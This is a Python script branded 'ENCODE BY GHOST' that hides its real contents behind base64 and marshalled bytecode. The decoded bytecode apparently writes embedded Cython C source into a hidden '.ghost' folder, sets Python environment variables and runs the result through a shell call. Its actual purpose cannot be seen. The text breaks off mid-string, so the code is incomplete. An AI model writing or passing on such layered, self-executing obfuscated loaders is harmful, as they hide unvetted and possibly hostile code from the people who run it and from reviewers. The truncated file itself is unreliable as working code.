# THIS ENCODE BY GHOST | @GHOST_RFX â™¤
G,H,O,S,T,J,I,I = map(chr, [71, 72, 79, 83, 84, 74, 73, 73])
GH, OS, TJ, II = G+H, O+S, T+J, I+I
GHOST = G+H+O+S+T+J+I+I
import tempfile as t
from os import path as ghost_path, remove as grdmv, system as stem
from base64 import b64decode as lmao
ghostenc = (b'aW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhlM1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDhceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhmM1x4YWNceDAzXHgwMFx4MDBceDk1XHgwMFxcXHgwMCJceDAwXFxceDAxL1x4MDBTXHgwMFFceDAxNVx4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDB1XHgwOFx4MDBceDAwclx4MDJyXHgwM3JceDA0clx4MDVyXHgwNnJceDA3clx4MDhyXHgwOFxcXHgwMlxcXHgwMy1ceDAwXHgwMFx4MDBcXFx4MDRcXFx4MDUtXHgwMFx4MDBceDAwXFxceDA2XFxceDA3LVx4MDBceDAwXHgwMFxcXHgwOFxcXHgwOC1ceDAwXHgwMFx4MDA0XHgwNHVceDA0XHgwMFx4MDByXHRyXG5yXHgwYnJceDBjXFxceDAyXFxceDAzLVx4MDBceDAwXHgwMFxcXHgwNC1ceDAwXHgwMFx4MDBcXFx4MDUtXHgwMFx4MDBceDAwXFxceDA2LVx4MDBceDAwXHgwMFxcXHgwNy1ceDAwXHgwMFx4MDBcXFx4MDgtXHgwMFx4MDBceDAwXFxceDA4LVx4MDBceDAwXHgwMHJcclNceDAxU1x4MDJLXHgwZXJceDBmU1x4MDFTXHgwM0tceDEwSlx4MTFyXHgxMkpceDEzclx4MTRKXHgxNXJceDE2IFx4MDBTXHgwMVNceDA0S1x4MTdKXHgxOHJceDE5IFx4MDBcXFx4MWEiXHgwMFNceDA1NVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAgXHgwMFxcXHgxYSJceDAwU1x4MDY1XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCBceDAwXFxceDFhIlx4MDBTXHgwNzVceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIFx4MDBcXFx4MWEiXHgwMFNceDA2NVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAgXHgwMFxcXHgxYiJceDAwU1x4MDg1XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFI4XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwclx4MWRTXHRyXHgxZVNcblxcXHgxYiJceDAwU1x4MDg1XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFI4XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwLVx4MDBceDAwXHgwMHJceDFmU1x4MGJcXFx4MWIiXHgwMFNceDA4NVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBSQFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMC1ceDAwXHgwMFx4MDByIVNceDBjXFxceDFlLVx4MDBceDAwXHgwMHIiXFxceDEyUkZceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiXHgwMFxcXHgxZTVceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwKFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBhXHgxY1x4MDBceDAwXFxceDE2Ilx4MDBcXFx4MWZTXHItXHgwMFx4MDBceDAwXFwhLVx4MDBceDAwXHgwMFNcci1ceDAwXHgwMFx4MDBcXCItXHgwMFx4MDBceDAwNVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAgXHgwMFxcJCJceDAwU1x4MDE1XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCBceDAwU1x4MGVyJVNceDBmciZTXHgxMFJPXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXFxceDFiIlx4MDBTXHgwODVceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwUlBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBSU1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFNceDExNVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBTXHgwMVx4MDVceDAwXHgwMFx4MDBSU1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFNceDEwNVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBTXHgwMlNceDEyXHgwNFx4MDA1XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMHIqU1x4MTNcXFx4MWQtXHgwMFx4MDBceDAwU1x4MTQtXHgwMFx4MDBceDAwXFwqLVx4MDBceDAwXHgwMFNceDE1LVx4MDBceDAwXHgwMFxcXHgxZS1ceDAwXHgwMFx4MDBTXHgxMS1ceDAwXHgwMFx4MDBcXCYtXHgwMFx4MDBceDAwU1x4MTYtXHgwMFx4MDBceDAwXFxceDFkLVx4MDBceDAwXHgwMFNceDE3LVx4MDBceDAwXHgwMFxcKi1ceDAwXHgwMFx4MDByK1xcLCJceDAwXFwmU1x4MTg1XHgwMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwci1cXC1SXVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFxcJTVceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIFx4MDBTXHgwMlNceDAyU1x4MDI1XHgwMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCBceDAwXFxceDFiIlx4MDBTXHgxOTVceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwUl9ceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBcXFx4MTJSYFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCJceDAwXFxceDFlNVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBTXHgxYVNceDFiOVx4MDIgXHgwMFxcXHgxNiJceDAwXFxceDFmU1xyLVx4MDBceDAwXHgwMFxcIS1ceDAwXHgwMFx4MDBTXHItXHgwMFx4MDBceDAwXFwrLVx4MDBceDAwXHgwMFNcci1ceDAwXHgwMFx4MDBcXCItXHgwMFx4MDBceDAwNVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAgXHgwMFxcXHgxNCJceDAwXFwmNVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAgXHgwMGdceDAyIVx4MDAsXHgwMChceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZFx4MDFceDAwXHgwMGZceDAyIFx4MDBceDFmXHgwMCBceDAwIFx4MDBOVz1ceDAzXHgxZlx4MDBmXHgwMSlceDFjKVx4MDhceGU5R1x4MDBceDAwXHgwMFx4ZTlIXHgwMFx4MDBceDAwXHhlOU9ceDAwXHgwMFx4MDBceGU5U1x4MDBceDAwXHgwMFx4ZTlUXHgwMFx4MDBceDAwXHhlOUpceDAwXHgwMFx4MDBceGU5SVx4MDBceDAwXHgwMHJceDA4XHgwMFx4MDBceDAwXHhlOVx4MDBceDAwXHgwMFx4MDBOKVx4MDNceGRhXHgwNHBhdGhceGRhXHgwNnJlbW92ZVx4ZGFceDA2c3lzdGVtKVx4MDFceGRhXHRiNjRkZWNvZGV1IVx4MDBceDAwXHgwMFx4MWJbMTs5Mm1ceDFiWzM4OzU7NDZtTE9BRElOR1x4ZTJceDgwXHhhMlx4ZTJceDgwXHhhMlx4ZTJceDgwXHhhMlx4ZGFceDAwdT1ceDAwXHgwMFx4MDBceDFiWzE7OTJtXHgxYlszODs1OzUwbSMjIyNUSElTIElTIEVOQ09ERUQgQlkgI0dIT1NUIFx4ZTJceDgwXHhhMiBAR0hPU1RfUkZYXHhkYVx4MDNzeXN6XHQuZ2hvc3QvdHR6XHgxMmV4cG9ydCBQWVRIT05IT01FPXpceDE5ZXhwb3J0IFBZVEhPTl9FWEVDVVRBQkxFPXpceDAyLi96XHgwMiYmYVx4YjgpXHgwZlx4MDBcblxuI2lmbmRlZiBQWV9TU0laRV9UX0NMRUFOXG4jZGVmaW5lIFBZX1NTSVpFX1RfQ0xFQU5cbiNlbmRpZiBcblxuI2lmIGRlZmluZWQoUHlfTElNSVRFRF9BUEkpXG4gICNpZiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpXG4gICNkZWZpbmUgQ1lUSE9OX0xJTUlURURfQVBJIDFcbiAgI2VuZGlmXG4jZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSlcbiAgI2lmZGVmIF9NU0NfVkVSXG4gICNwcmFnbWEgbWVzc2FnZSAoIkxpbWl0ZWQgQVBJIHVzYWdlIGlzIGVuYWJsZWQgd2l0aCBcJ0NZVEhPTl9MSU1JVEVEX0FQSVwnIGJ1dCBcJ1B5X0xJTUlURURfQVBJXCcgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nIFwnUHlfTElNSVRFRF9BUElcJyBpbnN0ZWFkLiIpXG4gICNlbHNlXG4gICN3YXJuaW5nIExpbWl0ZWQgQVBJIHVzYWdlIGlzIGVuYWJsZWQgd2l0aCBcJ0NZVEhPTl9MSU1JVEVEX0FQSVwnIGJ1dCBcJ1B5X0xJTUlURURfQVBJXCcgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nIFwnUHlfTElNSVRFRF9BUElcJyBpbnN0ZWFkLlxuICAjZW5kaWZcbiNlbmRpZlxuXG4jaW5jbHVkZSAiUHl0aG9uLmgiXG4jaWZuZGVmIFB5X1BZVEhPTl9IXG4gICAgI2Vycm9yIFB5dGhvbiBoZWFkZXJzIG5lZWRlZCB0byBjb21waWxlIEMgZXh0ZW5zaW9ucywgcGxlYXNlIGluc3RhbGwgZGV2ZWxvcG1lbnQgdmVyc2lvbiBvZiBQeXRob24uXG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwMDBcbiAgICAjZXJyb3IgQ3l0aG9uIHJlcXVpcmVzIFB5dGhvbiAzLjgrLlxuI2Vsc2VcbiNkZWZpbmUgX19QWVhfQUJJX1ZFUlNJT04gIjNfMl8wIlxuI2RlZmluZSBDWVRIT05fSEVYX1ZFUlNJT04gMHgwMzAyMDBGMFxuI2RlZmluZSBDWVRIT05fRlVUVVJFX0RJVklTSU9OIDFcblxuI2luY2x1ZGUgPHN0ZGRlZi5oPlxuI2lmbmRlZiBvZmZzZXRvZlxuICAjZGVmaW5lIG9mZnNldG9mKHR5cGUsIG1lbWJlcikgKCAoc2l6ZV90KSAmICgodHlwZSopMCkgLT4gbWVtYmVyIClcbiNlbmRpZlxuI2lmICFkZWZpbmVkKF9XSU4zMikgJiYgIWRlZmluZWQoV0lOMzIpICYmICFkZWZpbmVkKE1TX1dJTkRPV1MpXG4gICNpZm5kZWYgX19zdGRjYWxsXG4gICAgI2RlZmluZSBfX3N0ZGNhbGxcbiAgI2VuZGlmXG4gICNpZm5kZWYgX19jZGVjbFxuICAgICNkZWZpbmUgX19jZGVjbFxuICAjZW5kaWZcbiAgI2lmbmRlZiBfX2Zhc3RjYWxsXG4gICAgI2RlZmluZSBfX2Zhc3RjYWxsXG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIERMX0lNUE9SVFxuICAjZGVmaW5lIERMX0lNUE9SVCh0KSB0XG4jZW5kaWZcbiNpZm5kZWYgRExfRVhQT1JUXG4gICNkZWZpbmUgRExfRVhQT1JUKHQpIHRcbiNlbmRpZlxuI2RlZmluZSBfX1BZWF9DT01NQSAsXG4jaWZuZGVmIFBZX0xPTkdfTE9OR1xuICAjZGVmaW5lIFBZX0xPTkdfTE9ORyBMT05HX0xPTkdcbiNlbmRpZlxuI2lmbmRlZiBQeV9IVUdFX1ZBTFxuICAjZGVmaW5lIFB5X0hVR0VfVkFMIEhVR0VfVkFMXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCBQWV9WRVJTSU9OX0hFWFxuI2lmIGRlZmluZWQoR1JBQUxWTV9QWVRIT04pXG4gIFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMFxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMFxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAwXG4gICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwXG4gICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxXG4gICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORFxuICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgMVxuICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0NcbiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMFxuICAjdW5kZWYgQ1lUSE9OX0lNTU9SVEFMX0NPTlNUQU5UU1xuICAjZGVmaW5lIENZVEhPTl9JTU1PUlRBTF9DT05TVEFOVFMgMFxuI2VsaWYgZGVmaW5lZChQWVBZX1ZFUlNJT04pXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMFxuICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9HSUxcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMFxuICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMFxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICAjdW5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMFxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklOR1xuICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMFxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgKFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMEMwMClcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDBcbiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DXG4gICAgI2RlZmluZSBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzExMDApXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwXG4gICN1bmRlZiBDWVRIT05fSU1NT1JUQUxfQ09OU1RBTlRTXG4gICNkZWZpbmUgQ1lUSE9OX0lNTU9SVEFMX0NPTlNUQU5UUyAwXG4jZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSlcbiAgI2lmZGVmIFB5X0xJTUlURURfQVBJXG4gICAgI3VuZGVmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVhcbiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUHlfTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMVxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMVxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAwXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDBcbiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTXG4gICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDBcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAwXG4gICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDBcbiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDBcbiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMClcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwXG4gICNpZm5kZWYgQ1l